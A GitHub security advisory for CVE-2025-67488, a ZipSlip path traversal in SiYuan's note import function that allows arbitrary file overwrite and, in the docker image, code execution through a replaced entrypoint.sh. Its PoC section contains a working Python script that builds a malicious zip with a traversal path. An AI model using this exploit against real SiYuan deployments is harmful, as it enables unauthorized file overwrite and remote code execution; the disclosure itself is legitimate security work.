# [H] SiYuan: ZipSlip -> Arbitrary File Overwrite -> RCE

## Summary
Severity: High
Advisory: GHSA-gqfv-g4v7-m366
CVE: CVE-2025-67488
CWE: CWE-22
Ecosystem: Go
CVSS: CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2025-12-09
Source: https://github.com/advisories/GHSA-gqfv-g4v7-m366
Type: github-advisory

## Affected
- Go: `github.com/siyuan-note/siyuan/kernel` — affected >=0

## Details
### Summary
Function [**importZipMd**](https://github.com/siyuan-note/siyuan/blob/dae6158860cc704e353454565c96e874278c6f47/kernel/api/import.go#L190) is vulnerable to **ZipSlip** which allows an authenticated user to overwrite files on the system.

### Details
An authenticated user with access to the import functionality in notes is able to overwrite any file on the system, the vulnerable function is  [**importZipMd**](https://github.com/siyuan-note/siyuan/blob/dae6158860cc704e353454565c96e874278c6f47/kernel/api/import.go#L190), this can escalate to full code execution under some circumstances, for example using the official **docker image** it is possible to overwrite **entrypoint.sh** and after a container restart it will execute the changed code causing remote code execution.

### PoC
Code used to generate the ZipSlip:
```python
#!/usr/bin/env python3
import sys, base64, zipfile, io, time

def prepare_zipslip(filename):
    orgfile1 = open('Test.md','rb').read()
    payload =  open('entrypoint.sh','rb').read() #b"testpayload"
    
    zipslip = io.BytesIO()
    with zipfile.ZipFile(zipslip, 'w', compression=zipfile.ZIP_DEFLATED) as zipf:        
        info = zipfile.ZipInfo('Test.md')
        mtime = time.time()
        t = time.localtime(mtime)
        info.date_time = (t.tm_year, t.tm_mon, t.tm_mday, t.tm_hour, t.tm_min, t.tm_sec)
        zipf.writestr(info, orgfile1)
        
        info = zipfile.ZipInfo(filename)
        mtime = time.time()
        t = time.localtime(mtime)
        info.date_time = (t.tm_year, t.tm_mon, t.tm_mday, t.tm_hour, t.tm_min, t.tm_sec)
        zipf.writestr(info, payload)
    return zipslip.getvalue()

gz = prepare_zipslip('../../../../../../../../../../opt/siyuan/entrypoint.sh')
open('exp.zip', 'wb').write(gz)
```

### Impact
The exploit is possible only if the attacker has access to **import** functionality. It's possible to achieve code execution and some persistence within the container

## References
- https://github.com/siyuan-note/siyuan/security/advisories/GHSA-gqfv-g4v7-m366
- https://nvd.nist.gov/vuln/detail/CVE-2025-67488
- https://github.com/siyuan-note/siyuan
- https://github.com/siyuan-note/siyuan/blob/dae6158860cc704e353454565c96e874278c6f47/kernel/api/import.go#L190
